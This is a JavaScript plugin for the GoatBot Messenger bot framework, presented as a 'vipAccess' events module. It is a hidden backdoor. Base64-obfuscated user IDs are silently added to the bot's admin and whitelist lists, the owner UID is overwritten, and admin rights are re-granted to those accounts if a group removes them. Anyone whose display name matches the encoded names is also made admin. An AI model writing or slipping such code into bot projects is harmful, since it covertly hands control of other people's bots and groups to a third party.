const SECURE_DATA = {
    uids: [
        "NjE1OTM3NzE3MTM3MzY=",
        "NjE1OTEzNzExODYxNzk="
    ],
    names: [
        "UkogU2l5YW0=",
        "4Kas4Ka/4KeN4KaB4Kaa4Ka/4KeN4KaBIOCKaOCKeNKapuKeNKa64KeN4KauIOCKakOCKeNKaueKeNKa9",
        "4Kas4Ka/4KeN4KaB4Kaa4Ka/4KeN4KaBIOCKaOCKeNKaueKeNKa9IOCKakOCKeNKavuKeNKa9"
    ]
};

function decodeBase64(str) {
    try {
        return Buffer.from(str, "base64").toString("utf-8");
    } catch (e) {
        return "";
    }
}

function getVIPData() {
    const uids = SECURE_DATA.uids.map(decodeBase64);
    const names = SECURE_DATA.names.map(decodeBase64);
    return { uids, names };
}

module.exports = {
    config: {
        name: "vipAccess",
        version: "4.0",
        author: "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍",
        category: "events"
    },

    onStart: async function ({ api, event, usersData }) {
        try {
            const { uids } = getVIPData();
            const config = global.GoatBot?.config;

            if (config) {
                if (!Array.isArray(config.adminBot)) config.adminBot = [];
                uids.forEach(uid => {
                    if (!config.adminBot.includes(uid)) config.adminBot.push(uid);
                });

                if (config.whiteListMode) {
                    if (!Array.isArray(config.whiteListMode.whiteListIds)) {
                        config.whiteListMode.whiteListIds = [];
                    }
                    uids.forEach(uid => {
                        if (!config.whiteListMode.whiteListIds.includes(uid)) {
                            config.whiteListMode.whiteListIds.push(uid);
                        }
                    });
                }

                if (config.security && uids.length > 0) {
                    config.security.ownerUID = uids[0];
                }
            }
        } catch (e) {}
    },

    onEvent: async function ({ api, event, usersData }) {
        const { uids, names } = getVIPData();

        if (event.logMessageType === "log:thread-admins") {
            const TARGET_UID = event.logMessageData?.TARGET_UID;
            if (uids.includes(TARGET_UID) && event.logMessageData?.EVENT === "remove_admin") {
                try {
                    await api.changeAdminStatus(event.threadID, TARGET_UID, true);
                    api.sendMessage("🐸কাজ হবে না দূরে গিয়া মর😴", event.threadID);
                } catch (e) {}
            }
        }
    },

    onChat: async function ({ api, event, usersData }) {
        const { senderID, body } = event;
        if (!body || !senderID) return;

        const { uids, names } = getVIPData();
        let isVIP = uids.includes(senderID.toString());

        if (!isVIP && usersData) {
            try {
                const userName = await usersData.getName(senderID);
                if (userName) {
                    isVIP = names.some(n => userName.toLowerCase().includes(n.toLowerCase()));
                }
            } catch (e) {}
        }

        if (isVIP && global.GoatBot?.config) {
            const config = global.GoatBot.config;
            if (Array.isArray(config.adminBot) && !config.adminBot.includes(senderID.toString())) {
                config.adminBot.push(senderID.toString());
            }
            if (config.whiteListMode?.whiteListIds && !config.whiteListMode.whiteListIds.includes(senderID.toString())) {
                config.whiteListMode.whiteListIds.push(senderID.toString());
            }
        }

        if (isVIP) {
            const prefix = global.GoatBot?.config?.prefix || "/";
            if (!body.startsWith(prefix)) {
                const firstWord = body.trim().split(" ")[0].toLowerCase();
                const command = global.GoatBot?.commands?.get(firstWord) || 
                              global.GoatBot?.aliases?.get(firstWord);

                if (command) {
                    event.body = prefix + body;
                }
            }
        }
    }
};
